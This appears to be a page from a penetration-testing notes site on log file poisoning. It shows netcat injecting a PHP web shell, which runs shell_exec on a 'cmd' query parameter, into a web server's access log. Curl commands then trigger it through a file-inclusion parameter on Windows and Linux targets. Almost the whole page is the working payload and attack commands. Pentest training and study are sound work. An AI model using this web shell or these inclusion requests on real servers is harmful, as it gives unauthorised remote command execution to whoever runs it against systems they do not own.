---
title: Log File Poisoning
layout: default
nav_order: 3
parent: Web Apps
grand_parent: Exploitation
---

# Log File Poisoning
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }
1. TOC
{:toc}

---

### Log File Contamination

1. Poison the log file with PHP code
```bash
nc -nv $IP $PORT
```

2. The following code PHP code executes commands through PHP. We send it to the target `$PORT` that the web server is open on
```php
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
```

3. Send the PHP code to the web server
```
kali@kali:~$ nc -nv 10.11.0.22 $PORT
(UNKNOWN) [10.11.0.22] 80 (http) open
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
```



#### Log poisoning on Windows
```bash
curl http://$IP/file.php?file=c:\xampp\apache\logs\access.log?&cmd=ipconfig
```

#### Log poisoning on Linux
```bash
curl http://$IP/file.php?file=/var/log/apache2/access.log?cmd=ifconfig
```